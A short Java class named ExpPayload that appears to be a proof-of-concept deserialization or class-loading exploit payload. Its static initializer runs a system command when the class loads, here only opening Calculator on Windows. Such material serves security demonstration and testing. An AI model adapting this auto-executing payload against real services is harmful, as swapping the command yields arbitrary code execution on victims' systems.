package com.example.client;
import java.io.Serializable;

public class ExpPayload implements Serializable {

    static
    {
        System.out.println("ExpPayload executed");
        try {
            String os = System.getProperty("os.name");
            if (os.toLowerCase().contains("win"))
            {
                Runtime.getRuntime().exec("calc"); // Open Calculator on Windows
            }
            System.out.println("Command executed");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    @Override
    public String toString() {
        return "Exploit!";
    }
}
